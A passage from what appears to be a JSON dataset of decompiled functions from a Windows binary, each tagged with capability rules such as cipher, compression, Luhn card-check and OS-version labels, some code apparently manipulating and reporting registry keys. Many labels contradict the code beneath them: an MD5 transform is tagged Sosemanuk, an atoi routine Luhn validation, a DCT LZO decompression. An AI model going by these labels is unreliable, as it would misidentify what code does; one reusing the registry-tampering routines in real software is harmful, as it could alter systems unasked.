0;\n    param_1[0x16] = 0;\n    param_1[0xe] = 8;\n    param_1[0x1b] = 0;\n    param_1[0x15] = 0;\n    param_1[0x14] = 0;\n    param_1[0x13] = 0;\n    param_1[6] = 1;\n    param_1[0x1c] = 0;\n    param_1[0x1d] = 0;\n    param_1[0x1e] = 0;\n    param_1[0x1f] = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    puVar2 = param_1 + 0x8192;\n    for (iVar1 = 0x90; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    puVar2 = param_1 + 0x83d2;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 793
    },
    "00403f65": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t fcn.00403f65(char *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    \n    uVar3 = 0xffffffff;\n    pcVar4 = param_1;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = (uVar3 - 1 >> 2) * 3;\n    if (param_1[uVar3 - 2] == '=') {\n        if (param_1[uVar3 - 3] == '=') {\n            iVar2 = iVar2 + -2;\n        }\n        else {\n            iVar2 = iVar2 + -1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 223
    },
    "00404429": {
        "rules": [
            "encrypt data using HC-128/b24f3f77371449e18042164d6f6569c2"
        ],
        "decompiled_code": "\nvoid fcn.00404429(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    do {\n        *(iVar1 * 4 + 0x42a400) = iVar1 * 0x4c8b;\n        *(iVar1 * 4 + 0x429800) = iVar1 * -0x2b32;\n        *(iVar1 * 4 + 0x428c00) = iVar1 << 0xf;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0x100);\n    iVar1 = 0;\n    do {\n        *(iVar1 * 4 + 0x42a000) = iVar1 * 0x9646;\n        *(iVar1 * 4 + 0x429400) = iVar1 * -0x54cc;\n        *(iVar1 * 4 + 0x428800) = iVar1 * -0x6b2e;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0x100);\n    iVar1 = 0;\n    do {\n        *(iVar1 * 4 + 0x429c00) = iVar1 * 0x1d2f;\n        *(iVar1 * 4 + 0x429000) = iVar1 << 0xf;\n        *(iVar1 * 4 + 0x428400) = iVar1 * -0x14d0;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0x100);\n    return;\n}\n",
        "token_count": 343
    },
    "0040454f": {
        "rules": [
            "decompress data using LZO/9cc273784faa4ee59e2bb87ef99fa140"
        ],
        "decompiled_code": "\nvoid fcn.0040454f(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    float fVar1;\n    float fVar2;\n    float fVar3;\n    float fVar4;\n    float fVar5;\n    float fVar6;\n    float fVar7;\n    float fVar8;\n    float fVar9;\n    float fVar10;\n    int32_t iVar11;\n    float *pfVar12;\n    float *pfVar13;\n    float afStack260 [64];\n    float fStack4;\n    \n    fVar10 = *0x422eb4;\n    iVar11 = 0;\n    do {\n        afStack260[iVar11] = *(param_1 + iVar11);\n        iVar11 = iVar11 + 1;\n    } while (iVar11 != 0x40);\n    pfVar13 = afStack260;\n    do {\n        pfVar12 = pfVar13 + 8;\n        fVar2 = *pfVar13 + pfVar13[7];\n        fVar3 = *pfVar13 - pfVar13[7];\n        fVar8 = pfVar13[1] + pfVar13[6];\n        fVar9 = pfVar13[1] - pfVar13[6];\n        fVar6 = pfVar13[2] + pfVar13[5];\n        fVar7 = pfVar13[2] - pfVar13[5];\n        fVar1 = pfVar13[4];\n        fVar4 = pfVar13[3] + fVar1;\n        fVar5 = fVar2 + fVar4;\n        fVar2 = fVar2 - fVar4;\n        fVar4 = fVar8 + fVar6;\n        *pfVar13 = fVar5 + fVar4;\n        pfVar13[4] = fVar5 - fVar4;\n        fVar4 = ((fVar8 - fVar6) + fVar2) * *0x422ea4;\n        pfVar13[2] = fVar2 + fVar4;\n        pfVar13[6] = fVar2 - fVar4;\n        fVar2 = (pfVar13[3] - fVar1) + fVar7;\n        fVar1 = fVar9 + fVar3;\n        fVar4 = (fVar2 - fVar1) * *0x422ea8;\n        fVar2 = fVar2 * *0x422eac + fVar4;\n        fVar4 = fVar1 * *0x422eb0 + fVar4;\n        fVar5 = (fVar9 + fVar7) * *0x422ea4;\n        fVar1 = fVar3 + fVar5;\n        fVar3 = fVar3 - fVar5;\n        pfVar13[5] = fVar2 + fVar3;\n        pfVar13[3] = fVar3 - fVar2;\n        pfVar13[1] = fVar4 + fVar1;\n        pfVar13[7] = fVar1 - fVar4;\n        pfVar13 = pfVar12;\n    } while (pfVar12 != &fStack4);\n    pfVar13 = afStack260;\n    do {\n        pfVar12 = pfVar13 + 1;\n        fVar2 = *pfVar13 + pfVar13[0x38];\n        fVar3 = *pfVar13 - pfVar13[0x38];\n        fVar8 = pfVar13[8] + pfVar13[0x30];\n        fVar9 = pfVar13[8] - pfVar13[0x30];\n        fVar6 = pfVar13[0x10] + pfVar13[0x28];\n        fVar7 = pfVar13[0x10] - pfVar13[0x28];\n        fVar1 = pfVar13[0x20];\n        fVar4 = pfVar13[0x18] + fVar1;\n        fVar5 = fVar2 + fVar4;\n        fVar2 = fVar2 - fVar4;\n        fVar4 = fVar8 + fVar6;\n        *pfVar13 = fVar5 + fVar4;\n        pfVar13[0x20] = fVar5 - fVar4;\n        fVar4 = ((fVar8 - fVar6) + fVar2) * *0x422ea4;\n        pfVar13[0x10] = fVar2 + fVar4;\n        pfVar13[0x30] = fVar2 - fVar4;\n        fVar2 = (pfVar13[0x18] - fVar1) + fVar7;\n        fVar1 = fVar9 + fVar3;\n        fVar4 = (fVar2 - fVar1) * *0x422ea8;\n        fVar2 = fVar2 * *0x422eac + fVar4;\n        fVar4 = fVar1 * *0x422eb0 + fVar4;\n        fVar5 = (fVar9 + fVar7) * *0x422ea4;\n        fVar1 = fVar3 + fVar5;\n        fVar3 = fVar3 - fVar5;\n        pfVar13[0x28] = fVar2 + fVar3;\n        pfVar13[0x18] = fVar3 - fVar2;\n        pfVar13[8] = fVar4 + fVar1;\n        pfVar13[0x38] = fVar1 - fVar4;\n        pfVar13 = pfVar12;\n    } while (pfVar12 != afStack260 + 8);\n    iVar11 = 0;\n    do {\n        *(param_3 + iVar11) = ROUND(*(afStack260 + iVar11 * 2) * *(param_2 + iVar11 * 2) + fVar10) + -0x4000;\n        iVar11 = iVar11 + 2;\n    } while (iVar11 != 0x80);\n    return;\n}\n",
        "token_count": 1333
    },
    "004102d5": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid fcn.004102d5(uchar *param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    puVar4 = param_1 + param_2;\n    for (; param_1 != puVar4; param_1 = param_1 + 1) {\n        uVar2 = fcn.00410284();\n        uVar3 = uVar2 % 0xff + 1;\n        if (0x7f < uVar3) {\n            uVar3 = uVar2 % 0xff - 0x7e;\n        }\n        uVar1 = fcn.004102bc(uVar3, 0xff);\n        *param_1 = uVar1;\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0040b312": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid fcn.0040b312(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 * 4;\n        iVar2 = iVar2 + 1;\n        fcn.00407fab(*(param_1 + iVar1));\n    } while (iVar2 != 9);\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 * 4;\n        iVar2 = iVar2 + 1;\n        fcn.00407fab(*(param_2 + iVar1));\n    } while (iVar2 != 0x2c);\n    return;\n}\n",
        "token_count": 156
    },
    "00412666": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nint32_t fcn.00412666(char *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = 0;\n    if (param_1 != NULL) {\n        iVar1 = 0;\n        for (uVar2 = *param_1 == '-'; (param_1[uVar2] - 0x30U < 10 && (uVar2 < 0xb)); uVar2 = uVar2 + 1) {\n            iVar1 = iVar1 * 10 + -0x30 + param_1[uVar2];\n        }\n        iVar1 = iVar1 * ((*param_1 != '-') * 2 + -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 162
    },
    "004126af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nulong fcn.004126af(char *param_1)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    \n    if (param_1 == NULL) {\n        uVar7 = 0;\n        iVar8 = 0;\n    }\n    else {\n        iVar8 = 0;\n        uVar1 = (*param_1 != '-') * 2 - 1;\n        uVar3 = 0;\n        for (uVar9 = *param_1 == '-'; (param_1[uVar9] - 0x30U < 10 && (uVar9 < 0x15)); uVar9 = uVar9 + 1) {\n            uVar2 = uVar3;\n            uVar4 = uVar2 * 10;\n            uVar5 = param_1[uVar9];\n            uVar6 = uVar5 + uVar4;\n            uVar3 = uVar6 - 0x30;\n            iVar8 = (uVar5 >> 0x1f) + (uVar2 * 10 >> 0x20) + iVar8 * 10 + CARRY4(uVar5, uVar4) + -1 + (0x2f < uVar6);\n        }\n        uVar7 = uVar3 * uVar1;\n        iVar8 = (uVar3 * uVar1 >> 0x20) + (uVar1 >> 0x1f) * uVar3 + iVar8 * uVar1;\n    }\n    return CONCAT44(iVar8, uVar7);\n}\n",
        "token_count": 395
    },
    "0040b016": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.0040b016(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    uchar auStack540 [5];\n    uchar auStack535 [506];\n    uchar uStack29;\n    \n    bVar5 = false;\n    fcn.004129e4(param_2, 0, param_3);\n    uVar1 = sub.msvcrt.dll_fopen(param_1, 0x423378);\n    if (uVar1 == 0) goto code_r0x0040b0f8;\n    iVar2 = sub.msvcrt.dll_fread(auStack540, 1, 0x200, uVar1);\n    if (iVar2 == 0) {\ncode_r0x0040b089:\n        bVar5 = false;\n    }\n    else {\n        uStack29 = 0;\n        iVar2 = fcn.004125de(0, \"Path=\", auStack540);\n        iVar2 = iVar2 + 5;\n        iVar3 = fcn.004125de(iVar2, 0x423380, auStack540);\n        if (((iVar2 < 6) || (iVar3 + 1 <= iVar2)) || (uVar4 = (iVar3 + 1) - iVar2,  param_3 <= uVar4))\n        goto code_r0x0040b089;\n        iVar2 = fcn.00412548(param_2, auStack540 + iVar2, uVar4);\n        bVar5 = iVar2 != 0;\n    }\n    uVar1 = sub.msvcrt.dll_fclose(uVar1);\ncode_r0x0040b0f8:\n    return uVar1 & 0xffffff00 | bVar5;\n}\n",
        "token_count": 417
    },
    "00410fc4": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00410fc4(uint param_1, uchar *param_2, uchar *param_3, uchar *param_4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint8_t uVar4;\n    uchar *unaff_retaddr;\n    int32_t in_stack_00000020;\n    uchar *in_stack_fffffd70;\n    uchar *puStack648;\n    uchar *puStack644;\n    uint uStack640;\n    uchar *puStack636;\n    uchar *puStack632;\n    char *pcStack628;\n    uchar *puStack624;\n    uchar *puStack620;\n    uchar *puStack616;\n    uchar *puStack612;\n    uint uStack608;\n    uchar *puStack604;\n    uchar *puStack600;\n    uchar *puStack596;\n    uint uStack592;\n    uchar *puStack588;\n    uchar *puStack584;\n    uchar *puStack580;\n    uchar *puStack576;\n    uchar *puStack572;\n    uchar auStack568 [12];\n    uchar auStack556 [8];\n    uchar auStack548 [4];\n    uchar auStack544 [444];\n    uint uStack100;\n    uint uStack80;\n    uint uStack44;\n    uint uStack28;\n    \n    uVar1 = in_stack_00000020 - 1;\n    // switch table (6 cases) at 0x42444c\n    switch(uVar1) {\n    case 0:\n        puStack572 = &stack0xfffffddc;\n        puStack580 = NULL;\n        puStack584 = 0xf003f;\n        puStack588 = NULL;\n        uStack592 = 0;\n        puStack576 = &stack0xfffffdd4;\n        puStack596 = NULL;\n        puStack600 = param_3;\n        puStack604 = param_2;\n        uStack608 = 0x41103f;\n        uVar1 = sub.ADVAPI32.DLL_RegCreateKeyExA();\n        if (uVar1 == 0) {\n            puStack620 = param_3;\n            puStack624 = param_2;\ncode_r0x004110f1:\n            puStack636 = &stack0xfffffdc0;\n            pcStack628 = \"%c%.8x%s\";\n            puStack632 = 0x204;\n            uStack640 = 0x41110d;\n            uVar1 = fcn.004127a8();\ncode_r0x004111f1:\n            pcStack628 = &stack0xfffffdc0;\n            if (uVar1 != 0) {\n                puStack632 = 0xe8;\n                puStack636 = uStack28;\n                uStack640 = 0x411214;\n                puStack624 = uVar1;\n                uVar1 = fcn.00405d7d();\n            }\ncode_r0x00411214:\n            uVar4 = 1;\n            goto code_r0x004113aa;\n        }\n        break;\n    case 1:\n        puStack588 = &stack0xfffffdd4;\n        uStack592 = 0x2001f;\n        puStack596 = NULL;\n        puStack600 = param_3;\n        puStack604 = param_2;\n        uStack608 = 0x411083;\n        uVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (uVar1 == 0) {\n            puStack616 = NULL;\n            puStack620 = param_4;\n            puStack604 = param_2;\n            uStack608 = param_1;\n            puStack624 = puStack576;\n            pcStack628 = 0x4110c7;\n            puStack612 = unaff_retaddr;\n            iVar2 = sub.ADVAPI32.DLL_RegSetValueExA();\n            puStack648 = puStack600;\n            uVar1 = sub.ADVAPI32.DLL_RegCloseKey();\n            if (iVar2 == 0) goto code_r0x004110f1;\n        }\n        break;\n    case 2:\n        puStack596 = param_4;\n        puStack600 = param_3;\n        puStack604 = param_2;\n        uStack608 = 0x411122;\n        uVar1 = fcn.0041086b();\n        uVar4 = uVar1;\n        if (uVar4 != 0) {\n            puStack588 = param_2;\n            puVar3 = &stack0xfffffde0;\n            puStack580 = param_4;\n            puStack584 = param_3;\n            uStack592 = 3;\n            puStack596 = 0x424425;\n            puStack600 = 0x204;\n            uStack608 = 0x41115c;\n            puStack604 = puVar3;\n            uVar1 = fcn.004127a8();\n            if (uVar1 != 0) goto code_r0x00411387;\n            goto code_r0x00411214;\n        }\n        break;\n    case 3:\n        puStack588 = &stack0xfffffdd4;\n        uStack592 = 0x2001f;\n        puStack596 = NULL;\n        puStack600 = param_3;\n        puStack604 = param_2;\n        uStack608 = 0x41118d;\n        uVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (uVar1 == 0) {\n            puStack620 = param_4;\n            puStack624 = puStack576;\n            pcStack628 = 0x4111a8;\n            iVar2 = sub.ADVAPI32.DLL_RegDeleteValueA();\n            puStack632 = puStack584;\n            puStack636 = 0x4111b8;\n            uVar1 = sub.ADVAPI32.DLL_RegCloseKey();\n            if (iVar2 == 0) {\n                puStack636 = &stack0xfffffdc0;\n                puStack612 = param_4;\n                puStack616 = param_3;\n                puStack620 = param_2;\n                puStack624 = 0x4;\n                pcStack628 = \"%c%.8x%s\\\\%s\";\n                puStack632 = 0x204;\n                uStack640 = 0x4111f1;\n                uVar1 = fcn.004127a8();\n                goto code_r0x004111f1;\n            }\n        }\n        break;\n    case 5:\n        puStack588 = &stack0xfffffdd4;\n        uStack592 = 0x2001f;\n        puStack596 = NULL;\n        puStack600 = param_3;\n        puStack604 = param_2;\n        uStack608 = 0x41123f;\n        uVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (uVar1 == 0) {\n            puStack604 = &stack0xfffffdc4;\n            uStack608 = 0;\n            puStack616 = NULL;\n            puStack620 = param_4;\n            uVar4 = false;\n            puStack612 = &stack0xfffffdc8;\n            puStack624 = puStack576;\n            pcStack628 = 0x41127c;\n            iVar2 = sub.ADVAPI32.DLL_RegQueryValueExA();\n            if (iVar2 == 0) {\n                puStack648 = puStack596;\n                puStack588 = sub.msvcrt.dll_malloc();\n                if (puStack588 != NULL) {\n                    puStack636 = &stack0xfffffdb0;\n                    pcStack628 = &stack0xfffffdac;\n                    uStack640 = 0;\n                    puStack644 = param_4;\n                    puStack648 = puStack600;\n                    puStack632 = puStack588;\n                    iVar2 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                    if ((iVar2 == 0) &&\n                       (in_stack_fffffd70 = puStack612, \n                       iVar2 = sub.ADVAPI32.DLL_RegSetValueExA\n                                         (puStack624, uStack44, 0, puStack616, puStack612, puStack620),  iVar2 == 0)) {\n                        iVar2 = sub.ADVAPI32.DLL_RegDeleteValueA(puStack648, param_4);\n                        uVar4 = iVar2 == 0;\n                    }\n                    else {\n                        uVar4 = false;\n                    }\n                    fcn.00407f59(&stack0xfffffd7c);\n                }\n            }\n            uVar1 = sub.ADVAPI32.DLL_RegCloseKey(in_stack_fffffd70);\n            if (uVar4 == false) goto code_r0x004113aa;\n            puVar3 = &stack0xfffffd78;\n            uVar1 = fcn.004127a8(puVar3, 0x204, \"%c%.8x%s\\\\%s\\a%s\", 6, param_2, param_3, uStack80, param_4);\n            if (uVar1 == 0) goto code_r0x004113aa;\ncode_r0x00411387:\n            uVar1 = fcn.00405d7d(uStack100, 0xe8, puVar3, uVar1);\n            goto code_r0x004113aa;\n        }\n    }\n    uVar4 = 0;\ncode_r0x004113aa:\n    return uVar1 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 2064
    },
    "004081aa": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint fcn.004081aa(uint param_1)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint auStack76 [17];\n    \n    puVar3 = \"_BqwHaF8TkKDMfOzQASx4VuXdZibUIeylJWhj0m5o2ErLt6vGRN9sY1n3Ppc7g-C%.4d-%.2d-%.2d %.2d:%.2d:%.2d\";\n    puVar4 = auStack76;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.004127a8(0x42b340, 0x104, 0x422f6a, param_1);\n    pcVar2 = 0x42b340;\n    do {\n        if (*pcVar2 == '\\0') {\n            return 0x42b340;\n        }\n        iVar1 = 0;\n        do {\n            if (*pcVar2 == *(auStack76 + iVar1)) {\n                *pcVar2 = *(auStack76 + (iVar1 + 6U & 0x3f));\n                break;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 != 0x40);\n        pcVar2 = pcVar2 + 1;\n    } while( true );\n}\n",
        "token_count": 366
    },
    "0040a728": {
        "rules": [
            "encrypt data using Sosemanuk/d9cb91cf002a4780a153bbbb736437ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a728(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    int32_t iStack28;\n    \n    iStack28 = *(in_EAX + 8);\n    uStack44 = *(in_EAX + 0xc);\n    uStack40 = *(in_EAX + 0x10);\n    uStack36 = *(in_EAX + 0x14);\n    piVar1 = param_2;\n    do {\n        uVar2 = ((uStack40 ^ uStack36) & uStack44 ^ uStack36) + iStack28 + -0x28955b88 + *piVar1;\n        uVar3 = (uVar2 * 0x80 | uVar2 >> 0x19) + uStack44;\n        uVar2 = ((uStack44 ^ uStack40) & uVar3 ^ uStack40) + uStack36 + 0xe8c7b756 + piVar1[1];\n        uVar4 = (uVar2 * 0x1000 | uVar2 >> 0x14) + uVar3;\n        uVar2 = ((uStack44 ^ uVar3) & uVar4 ^ uStack44) + uStack40 + 0x242070db + piVar1[2];\n        uVar5 = (uVar2 >> 0xf | uVar2 * 0x20000) + uVar4;\n        uVar2 = ((uVar3 ^ uVar4) & uVar5 ^ uVar3) + uStack44 + 0xc1bdceee + piVar1[3];\n        uVar2 = (uVar2 >> 10 | uVar2 * 0x400000) + uVar5;\n        uVar3 = ((uVar4 ^ uVar5) & uVar2 ^ uVar4) + uVar3 + 0xf57c0faf + piVar1[4];\n        uVar3 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar2;\n        uVar4 = ((uVar5 ^ uVar2) & uVar3 ^ uVar5) + uVar4 + 0x4787c62a + piVar1[5];\n        uVar4 = (uVar4 * 0x1000 | uVar4 >> 0x14) + uVar3;\n        uVar5 = ((uVar2 ^ uVar3) & uVar4 ^ uVar2) + uVar5 + 0xa8304613 + piVar1[6];\n        uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar4;\n        uVar2 = ((uVar3 ^ uVar4) & uVar5 ^ uVar3) + uVar2 + 0xfd469501 + piVar1[7];\n        uVar2 = (uVar2 >> 10 | uVar2 * 0x400000) + uVar5;\n        uVar3 = ((uVar4 ^ uVar5) & uVar2 ^ uVar4) + uVar3 + 0x698098d8 + piVar1[8];\n        uVar3 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar2;\n        uVar4 = ((uVar5 ^ uVar2) & uVar3 ^ uVar5) + uVar4 + 0x8b44f7af + piVar1[9];\n        uVar4 = (uVar4 * 0x1000 | uVar4 >> 0x14) + uVar3;\n        uVar5 = ((uVar2 ^ uVar3) & uVar4 ^ uVar2) + (uVar5 - 0xa44f) + piVar1[10];\n        uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar4;\n        uVar2 = ((uVar3 ^ uVar4) & uVar5 ^ uVar3) + uVar2 + 0x895cd7be + piVar1[0xb];\n        uVar2 = (uVar2 >> 10 | uVar2 * 0x400000) + uVar5;\n        uVar3 = ((uVar4 ^ uVar5) & uVar2 ^ uVar4) + uVar3 + 0x6b901122 + piVar1[0xc];\n        uVar3 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar2;\n        uVar4 = ((uVar5 ^ uVar2) & uVar3 ^ uVar5) + uVar4 + 0xfd987193 + piVar1[0xd];\n        uVar4 = (uVar4 * 0x1000 | uVar4 >> 0x14) + uVar3;\n        uVar5 = ((uVar2 ^ uVar3) & uVar4 ^ uVar2) + uVar5 + 0xa679438e + piVar1[0xe];\n        uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar4;\n        uVar2 = ((uVar3 ^ uVar4) & uVar5 ^ uVar3) + uVar2 + 0x49b40821 + piVar1[0xf];\n        uVar2 = (uVar2 >> 10 | uVar2 * 0x400000) + uVar5;\n        uVar3 = ((uVar5 ^ uVar2) & uVar4 ^ uVar5) + piVar1[1] + -0x9e1da9e + uVar3;\n        uVar3 = (uVar3 * 0x20 | uVar3 >> 0x1b) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3) & uVar5 ^ uVar2) + piVar1[6] + -0x3fbf4cc0 + uVar4;\n        uVar4 = (uVar4 * 0x200 | uVar4 >> 0x17) + uVar3;\n        uVar5 = ((uVar3 ^ uVar4) & uVar2 ^ uVar3) + piVar1[0xb] + 0x265e5a51 + uVar5;\n        uVar6 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar4;\n        uVar2 = ((uVar4 ^ uVar6) & uVar3 ^ uVar4) + *piVar1 + -0x16493856 + uVar2;\n        uVar2 = (uVar2 >> 0xc | uVar2 * 0x100000) + uVar6;\n        uVar3 = ((uVar6 ^ uVar2) & uVar4 ^ uVar6) + piVar1[5] + -0x29d0efa3 + uVar3;\n        uVar3 = (uVar3 * 0x20 | uVar3 >> 0x1b) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3) & uVar6 ^ uVar2) + piVar1[10] + 0x2441453 + uVar4;\n        uVar5 = (uVar4 * 0x200 | uVar4 >> 0x17) + uVar3;\n        uVar4 = ((uVar3 ^ uVar5) & uVar2 ^ uVar3) + piVar1[0xf] + -0x275e197f + uVar6;\n        uVar6 = (uVar4 * 0x4000 | uVar4 >> 0x12) + uVar5;\n        uVar2 = ((uVar5 ^ uVar6) & uVar3 ^ uVar5) + piVar1[4] + -0x182c0438 + uVar2;\n        uVar2 = (uVar2 >> 0xc | uVar2 * 0x100000) + uVar6;\n        uVar3 = ((uVar6 ^ uVar2) & uVar5 ^ uVar6) + piVar1[9] + 0x21e1cde6 + uVar3;\n        uVar4 = (uVar3 * 0x20 | uVar3 >> 0x1b) + uVar2;\n        uVar3 = ((uVar2 ^ uVar4) & uVar6 ^ uVar2) + piVar1[0xe] + -0x3cc8f82a + uVar5;\n        uVar5 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar3 = ((uVar4 ^ uVar5) & uVar2 ^ uVar4) + piVar1[3] + -0xb2af279 + uVar6;\n        uVar6 = (uVar3 * 0x4000 | uVar3 >> 0x12) + uVar5;\n        uVar2 = ((uVar5 ^ uVar6) & uVar4 ^ uVar5) + piVar1[8] + 0x455a14ed + uVar2;\n        uVar3 = (uVar2 >> 0xc | uVar2 * 0x100000) + uVar6;\n        uVar2 = ((uVar6 ^ uVar3) & uVar5 ^ uVar6) + piVar1[0xd] + -0x561c16fb + uVar4;\n        uVar4 = (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar3;\n        uVar2 = ((uVar3 ^ uVar4) & uVar6 ^ uVar3) + piVar1[2] + -0x3105c08 + uVar5;\n        uVar5 = (uVar2 * 0x200 | uVar2 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar5) & uVar3 ^ uVar4) + piVar1[7] + 0x676f02d9 + uVar6;\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar5;\n        uVar3 = piVar1[0xc] + -0x72d5b376 + uVar3 + (uVar4 & (uVar2 ^ uVar5) ^ uVar5);\n        uVar3 = (uVar3 >> 0xc | uVar3 * 0x100000) + uVar2;\n        uVar4 = (uVar2 ^ uVar5 ^ uVar3) + piVar1[5] + -0x5c6be + uVar4;\n        uVar6 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar3;\n        uVar4 = (uVar2 ^ uVar3 ^ uVar6) + piVar1[8] + -0x788e097f + uVar5;\n        uVar4 = (uVar4 * 0x800 | uVar4 >> 0x15) + uVar6;\n        uVar2 = (uVar3 ^ uVar6 ^ uVar4) + piVar1[0xb] + 0x6d9d6122 + uVar2;\n        uVar5 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar4;\n        uVar2 = (uVar6 ^ uVar4 ^ uVar5) + piVar1[0xe] + -0x21ac7f4 + uVar3;\n        uVar2 = (uVar2 >> 9 | uVar2 * 0x800000) + uVar5;\n        uVar3 = (uVar4 ^ uVar5 ^ uVar2) + piVar1[1] + -0x5b4115bc + uVar6;\n        uVar3 = (uVar3 * 0x10 | uVar3 >> 0x1c) + uVar2;\n        uVar4 = (uVar5 ^ uVar2 ^ uVar3) + piVar1[4] + 0x4bdecfa9 + uVar4;\n        uVar4 = (uVar4 * 0x800 | uVar4 >> 0x15) + uVar3;\n        uVar5 = (uVar2 ^ uVar3 ^ uVar4) + piVar1[7] + -0x944b4a0 + uVar5;\n        uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar4;\n        uVar2 = (uVar3 ^ uVar4 ^ uVar5) + piVar1[10] + -0x41404390 + uVar2;\n        uVar2 = (uVar2 >> 9 | uVar2 * 0x800000) + uVar5;\n        uVar3 = (uVar4 ^ uVar5 ^ uVar2) + piVar1[0xd] + 0x289b7ec6 + uVar3;\n        uVar6 = (uVar3 * 0x10 | uVar3 >> 0x1c) + uVar2;\n        uVar3 = (uVar5 ^ uVar2 ^ uVar6) + *piVar1 + -0x155ed806 + uVar4;\n        uVar4 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar6;\n        uVar3 = (uVar2 ^ uVar6 ^ uVar4) + piVar1[3] + -0x2b10cf7b + uVar5;\n        uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar4;\n        uVar2 = (uVar6 ^ uVar4 ^ uVar3) + piVar1[6] + 0x4881d05 + uVar2;\n        uVar5 = (uVar2 >> 9 | uVar2 * 0x800000) + uVar3;\n        uVar2 = (uVar4 ^ uVar3 ^ uVar5) + piVar1[9] + -0x262b2fc7 